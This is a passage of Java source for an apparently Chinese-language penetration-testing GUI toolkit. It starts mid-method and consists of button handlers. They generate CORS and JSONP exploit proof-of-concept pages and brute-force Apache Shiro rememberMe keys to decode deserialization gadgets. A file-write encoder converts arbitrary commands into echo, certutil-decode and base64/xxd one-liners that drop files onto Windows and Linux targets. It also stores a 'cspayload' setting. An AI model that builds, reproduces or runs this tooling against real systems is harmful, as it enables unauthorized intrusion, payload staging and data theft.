                        lists[j][2] = mid[0][2];
                    }
                }
        for(int i = 0;i<lists.length;i++)
            if (lists[i][0] != null )
                uriLists = uriLists + lists[i][0] + '\n';

        mTextArea22.setText(uriLists);

        String[] sessionList = getSession(druidVulnUrl);
        String session = "";
        for(int i=0;i<sessionList.length;i++)
            session = session + sessionList[i] + '\n';
        mTextArea24.setText(session); // session
    }

    // 生成poc，cors与jsonp
    public void onButton27Click(ActionEvent actionEvent) throws Exception {
        String http = "http"; // 默认协议为http

        if(mRadiobutton7.isSelected()) { // 如果CORS选中
            String httpRequests = mTextArea25.getText().trim(); // CORS的数据包
            if (mRadiobutton9.isSelected())
                http = "https";
            String CorsContent = CorsPocMake(httpRequests,http);
            mTextArea26.setText(CorsContent);

        }else if(mRadiobutton8.isSelected()){
            String jsonpVulnurl = mTextArea25.getText().trim(); // jsonp地址
            String Content = JsonpPocMake(jsonpVulnurl);
            mTextArea26.setText(Content);
        }
    }

    public void onButton28Click(ActionEvent actionEvent) throws Exception {
        String fileContent = mTextArea26.getText();
        String filename = "";
        if(mRadiobutton7.isSelected())  // 如果CORS选中
            filename = "poc2jar-cors";
        if(mRadiobutton8.isSelected())  // 如果JSONP选中
            filename = "poc2jar-jsonp";
        Stage stage=new Stage();
        FileChooser fileChooser = new FileChooser();
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("HTML", "*.html"),
                new FileChooser.ExtensionFilter("JavaScript", "*.js")
        );
        fileChooser.setInitialFileName(filename);
        File file2 = fileChooser.showSaveDialog(stage);
        fileChooser.setTitle("保存html文件");
//        System.out.println(file2.getAbsolutePath());
        if (file2 != null) {
            if(!file2.exists())
            {
                try {
                    file2.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            try (FileWriter fileWriter = new FileWriter(file2.getAbsolutePath())) {
                fileWriter.append(fileContent);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    // shiro rememberme参数解密
    public void onButton29Click(ActionEvent actionEvent) throws Exception {
        byte[] fileContents;
        String total = "";
        String key ;
        SerializationDumper sd = new SerializationDumper();
        String rememberMe = mTextArea27.getText().trim();
        Expdecode shiroDecypt = new Expdecode();
        try {
            if (mRadiobutton11.isSelected()) {
                fileContents = shiroDecypt.BruteCipherKeygcm( rememberMe , "property/keys.conf");
                key = shiroDecypt.BruteCipherKeygcm( rememberMe , "property/keys.conf", "1");
            } else {
                fileContents = shiroDecypt.BruteCipherKey( rememberMe , "property/keys.conf");
                key = shiroDecypt.BruteCipherKey( rememberMe , "property/keys.conf", "1");
            }

            mTextField13.setText(key);

            for (int i = 0; i < fileContents.length; ++i) {
                sd._data.add(fileContents[i]);
            }

            sd._enablePrinting = false;
            sd.parseStream();

            String[] command = new String[100];
            command[0] = "java";
            command[1] = "-jar";
            command[2] = "property/fernflower.jar";
            command[3] = "property/bytecodes.class";
            command[4] = "property/";
            String[] commands = deleteArrayNull(command); // class反编译变成java命令

            try {
                Process pro = Runtime.getRuntime().exec(commands);
                Robot r = new Robot();
                r.delay(3000);
                File f = new File("property/bytecodes.java");

                File f2 = new File( "property/bytecodes.class");
                File f3 = new File( "property/shiro.ser");
//            System.out.println(tempPath + "/property/shiro.ser");

//                System.out.println(f3.delete());
                System.out.println(f2.delete());
                if ( f.exists() && f.length() > 0L) {
                    System.out.println("[+] 使用的Gadeget为TemplatesImpl，bytecodes中的代码存放在bytecodes.class，可直接用idea等查看");
                    String s = null;
                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
                    while((s = br.readLine()) != null) {
                        total = total + s + "\n";
                    }
                    br.close();
                    mTextArea28.setText(total);
                    System.out.println(f.delete());
                } else {
                    mTextArea28.setText("[+] 序列化数据存放在shiro.ser，可使用xxd shiro.ser来查找感兴趣的内容");
                    System.out.println("[+] 序列化数据存放在shiro.ser，可使用xxd shiro.ser来查找感兴趣的内容");
                }


            } catch (IOException e) {
                e.printStackTrace();
            }

        }catch (Exception e){
            mTextArea28.setText("解密失败，请确认是否可解密或默认key无法解密");
        }



    }

    // 加解密模块-解密
    public void onButton30Click(ActionEvent actionEvent) throws Exception {
        String encodemode = (String) mChoiceBox1.getValue(); // AES / DES / DESede
        String ivmode = (String) mChoiceBox2.getValue(); // iv模式 ECB / CBC
        String paddingmode = (String) mChoiceBox3.getValue(); // 填充模式
        String sSrcmode = (String) mChoiceBox4.getValue(); // 密文编码
        String keyivmode = (String) mChoiceBox5.getValue(); // key iv编码

        String skey = mTextField14.getText().trim(); // key 密钥
        String iv = mTextField15.getText().trim(); // iv
        String sSrc = mTextArea29.getText().trim(); // 密文

        if (mRadiobutton10.isSelected()){
            String dDes2 = decryptbuwei(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
            mTextArea30.setText(dDes2);
        }else {
            if (keyivmode.equals("Base64")) { // 根据key iv的模式进行选择
                String dDes2 = decryptJsCode(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea30.setText(dDes2);
            }else if(keyivmode.equals("Hex")){
                String dDes2 = decryptJsCode(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea30.setText(dDes2);
            }else {
                String dDes = decrypt(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode);
                mTextArea30.setText(dDes);
            }
        }
    }

    // 加解密模块-加密
    public void onButton31Click(ActionEvent actionEvent) throws Exception {
        String encodemode = (String) mChoiceBox1.getValue(); // AES / DES / DESede
        String ivmode = (String) mChoiceBox2.getValue(); // iv模式 ECB / CBC
        String paddingmode = (String) mChoiceBox3.getValue(); // 填充模式
        String sSrcmode = (String) mChoiceBox4.getValue(); // 密文编码
        String keyivmode = (String) mChoiceBox5.getValue(); // key iv编码

        String skey = mTextField14.getText().trim(); // key 密钥
        String iv = mTextField15.getText().trim(); // iv
        String sSrc = mTextArea30.getText().trim(); // 明文
        if (mRadiobutton10.isSelected()){
            String dDes2 = encryptbuwei(sSrc,"123" ,skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
            mTextArea29.setText(dDes2);
        }else {
            if (keyivmode.equals("Base64")) { // 根据key iv的模式进行选择
                String dDes2 = encryptJsUserInfo(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea29.setText(dDes2);
            } else if (keyivmode.equals("Hex")) { // 根据key iv的模式进行选择
                String dDes2 = encryptJsUserInfo(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea29.setText(dDes2);
            }else {
                String dDes = encrypt(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode);
                mTextArea29.setText(dDes);
            }
        }
    }

    // 提取路径模块
    public void onButton32Click(ActionEvent actionEvent) throws Exception {
        proxy();
        String pattern = "(http[s]{0,1}://.*?)/|(http[s]{0,1}://.*)"; // 匹配域名
        String url = mTextField20.getText().trim();
        String pat = mTextArea34.getText().trim();
        String black_lists = mTextArea33.getText().trim(); // 黑名单
        String input = mTextArea31.getText().trim(); // 输入or url，匹配一个

        String total = "";
        String total2 = "";
        String[] url_list;
        test7.vullist = new ArrayList();

        if (pat.contains(".")){

            String[] pats = pat.split("\n");
            for( String str: pats) {
                total = total + str.replace(".", "\\.");
                total = total + ".*?|";
            }
            pat = "(" + total.substring(0,total.length()-1) + ")";

        }else{
            if (pat.equals(""))
                pat = "/";
        }
        if (!url.equals("")) {
            // 创建 Pattern 对象
            Pattern r = Pattern.compile(pattern);
            // 现在创建 matcher 对象
            Matcher m = r.matcher(url);
            m.find();
            String host = m.group(); // 获取协议+域名
            Set<String> response = extractLists(url, pat);
            url_list = new ArrayList<>(response).toArray(new String[0]);
            for (int i = 0; i < url_list.length; i++) {
                test7.vullist.add(url_list[i]);
                if (!url_list[i].contains("http"))
                    url_list[i] = host.substring(0, host.length() - 1) + url_list[i];
            }
            test7 a = new test7();
            a.getUriList( url_list , pat );
            String[] blacklists = black_lists.split("\n");
            Set<String> total_lists = new HashSet<>();

            for (String strr: test7.vullist) {
                String isblack = "0";
                for (String str:blacklists) { // 剔除黑名单
                    if (strr.contains(str))
                        isblack = "1";
                }
                if (isblack.equals("0"))
                    total_lists.add(strr.trim());
            }
            for (String strr: total_lists) {
                total2 = total2 + strr + "\n";
            }
        }
        else{
            Set<String> response = extractListsinput(input, pat);
            url_list = new ArrayList<>(response).toArray(new String[0]);

            String[] blacklists = black_lists.split("\n");
            Set<String> total_lists = new HashSet<>();

            for (String strr : url_list) {
                String isblack = "0";
                if (!black_lists.equals(""))
                    for (String str : blacklists) { // 剔除黑名单
                        if (strr.contains(str))
                            isblack = "1";
                    }
                if (isblack.equals("0"))
                    total_lists.add(strr.trim());
            }
            for (String strr : total_lists) {
                total2 = total2 + strr + "\n";
            }
        }
        System.out.println(total2);
        mTextArea32.setText(total2.trim());

    }

    // 生成python路径
    public void onButton12Click(ActionEvent actionEvent) throws IOException {
        String python2path = mTextField8.getText().trim(); // python2 路径
        String python3path = mTextField82.getText().trim(); // python3 路径
        String cspayload = mTextField9.getText().trim();
        String pocsuitepath = mTextField83.getText().trim(); // pocsuite 路径

        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径

        String os = System.getProperty("os.name");

        if (!jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")) {

            System.out.println("无jar，不修改");

        }else if(os.toLowerCase().startsWith("win")){
            String target = "python2path=" + python2path + '\n' + "python3path=" + python3path + '\n' + "cspayload=" + cspayload +  '\n' + "pocsuite=" + pocsuitepath;
            poctoFile(target, "property/config.properties");

        }else{
            Properties prop = new Properties();
            prop.load(Main.class.getResourceAsStream("/config.properties"));  // 读取源文件

            prop.setProperty("python2path", python2path);
            prop.setProperty("python3path", python3path);
            prop.setProperty("pocsuite", pocsuitepath);
            String tempPath = jarPath.substring(0, jarPath.lastIndexOf("/")) + "/config.properties";

            System.out.println(tempPath);
            Writer w = new FileWriter(tempPath);
            prop.store(w, "python run path");
            w.close();
            String[] command = new String[100];
            command[0] = "jar";
            command[1] = "uf";
            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
            command[3] = "config.properties";
            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties 替换jar里面的config.properties文件

            String[] commands = deleteArrayNull(command);
            for (String s : commands)
                System.out.println(s);

            try {
                Process pro = Runtime.getRuntime().exec(commands);
                String[] command2 = new String[100];
                Robot r = new Robot();
                r.delay(500);
                command2[0] = "rm";
                command2[1] = tempPath;
                String[] commands2 = deleteArrayNull(command2);
                Process pro2 = Runtime.getRuntime().exec(commands2);

            } catch (Exception e) {
                // TODO: handle exception
            }
        }
    }

    public void onButton33Click(ActionEvent actionEvent) throws Exception {
        Stage stage=new Stage();
        FileChooser fileChooser = new FileChooser();
        //fileChooser.getExtensionFilters().addAll(
        //        new FileChooser.ExtensionFilter("HTML", "*.class"),
        //        new FileChooser.ExtensionFilter("HTML", "*.txt")
        //);
        File file2 = fileChooser.showOpenDialog(stage);

        try {
            mLabel5.setText(file2.getAbsolutePath() );

            mTextArea35.setText(Base64Encode(file2));

            mTextArea36.setText(bytesEncode(file2));

            mTextArea37.setText(bcelEncodeclass(file2));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @FXML
    // 文件写入模块
    // mTextArea38_input 输入命令自动出相应的转码命令
    public void fileWriteEncode(KeyEvent event) throws FileNotFoundException, UnsupportedEncodingException {
        String mTextArea38content = mTextArea38_input.getText().trim();
        StringBuilder total = new StringBuilder();
        StringBuilder total2 = new StringBuilder();
        if (mTextArea38content.equals("")) {
            mTextArea38.setText("");
            mTextArea39.setText("");
            mTextArea40.setText("");
            mTextArea41.setText("");
            mTextArea42.setText("");
            mTextArea43.setText("");
            mTextArea44.setText("");
        }else {
            if (mTextArea38content.contains("\n")) {
                String[] cmds = mTextArea38content.split("\n");
                for (String single_cmd : cmds) {
                    String single_echo = "set /p= " + single_cmd.replace("<", "^<").replace(">", "^>").replace("&", "^&").replace("|", "^|") + "<nul >> 1.xxx&";
                    total.append(single_echo);

                    String single_echo2 = "echo " + single_cmd.replace("<", "^<").replace(">", "^>").replace("&", "^&").replace("|", "^|") + " >> 1.xxx&";
                    total2.append(single_echo2);
                }
                // set write
                mTextArea38.setText(  total.substring(0, total.length() - 1)  );

                // echo write
                mTextArea39.setText(  total2.substring(0, total2.length() - 1) );

                // certutil base64
                String base64encodedString = Base64.getEncoder().encodeToString(mTextArea38content.getBytes(StandardCharsets.UTF_8));
                mTextArea40.setText("echo " + base64encodedString + " > 111.txt\n\ncertutil -f -decode 111.txt C:\\\\111.xxx");

                // certutil hex
                mTextArea41.setText("echo " + str2HexStr(mTextArea38content,"utf-8").toLowerCase() + " > 111.txt\n\ncertutil -decodehex 111.txt C:\\\\111.xxx");

                // echo write linux
                mTextArea42.setText("echo '" + mTextArea38content.replace("'","\\47").replace("\n","\\n") + "' > 111.xxx");

                // echo Base64 linux
                mTextArea43.setText("echo " + base64encodedString + " |base64 -d > 111.xxx");

                // echo Hex  linux
                mTextArea44.setText("echo " + str2HexStr(mTextArea38content,"utf-8").toLowerCase() + "|xxd -r -ps > 111.xxx");


            }else {
                // set write
                mTextArea38.setText("set /p=" + mTextArea38content.replace("<", "^<").replace(">", "^>").replace("&", "^7").replace("|", "^|") + "<nul > C:\\11.txt");

                // echo write
                mTextArea39.setText("echo " + mTextArea38content.replace("<", "^<").replace(">", "^>").replace("&", "^7").replace("|", "^|").replace("\n", "\\n") + " > 111.xxx");

                // certutil base64
                String base64encodedString = Base64.getEncoder().encodeToString(mTextArea38content.getBytes(StandardCharsets.UTF_8));
                mTextArea40.setText("echo " + base64encodedString + " > 111.txt\n\ncertutil -f -decode 111.txt C:\\\\111.xxx");

                // certutil hex
                mTextArea41.setText("echo " + str2HexStr(mTextArea38content, "utf-8").toLowerCase() + " > 111.txt\n\ncertutil -decodehex 111.txt C:\\\\111.xxx");

                // echo write linux
                mTextArea42.setText("echo '" + mTextArea38content.replace("'", "\\47").replace("\n", "\\n") + "' > 111.xxx");

                // echo Base64 linux
                mTextArea43.setText("echo " + base64encodedString + " |base64 -d > 111.xxx");

                // echo Hex  linux
                mTextArea44.setText("echo " + str2HexStr(mTextArea38content, "utf-8").toLowerCase() + "|xxd -r -ps > 111.xxx");

            }
        }
    }

}
